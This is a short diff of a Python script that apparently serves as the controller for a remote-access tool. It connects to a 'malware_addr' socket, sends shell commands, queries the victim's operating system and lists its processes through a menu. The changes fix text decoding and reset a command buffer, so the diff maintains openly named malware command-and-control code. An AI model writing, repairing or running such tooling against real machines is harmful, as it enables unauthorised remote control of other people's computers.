@@ -16,10 +16,10 @@ class Shell:
         s.send(self._command.encode("utf-8"))
 
     def receive(self):
-        content = s.recv(4096).decode("utf-8")
+        content = s.recv(4096).decode("utf-8", errors="ignore")
         # error when nothing
         if content[2:] == "cd":
-            malware_os.chdir(self._command[3:].decode("utf-8"))
+            malware_os.chdir(self._command[3:].decode("utf-8", errors="ignore"))
         print(content)
 
     def history(self):
@@ -131,9 +131,9 @@ try:
 except socket.error:
     print("[!] Unable to connect to the following address: {}".format(malware_addr))
     sys.exit(0)
-print(s.recv(4096).decode('utf-8'))
+print(s.recv(4096).decode('utf-8', errors="ignore"))
 s.send("os".encode("utf-8"))
-malware_os = s.recv(4096).decode('utf-8')
+malware_os = s.recv(4096).decode('utf-8', errors="ignore")
 
 getinfo = GetInfo(malware_os)
 shell = Shell()
@@ -173,6 +173,7 @@ while message != "exit":
         shell.set_command(getinfo.list_process())
         shell.send()
         shell.receive()
+        shell.set_command("")
 
 
     elif message == "3":
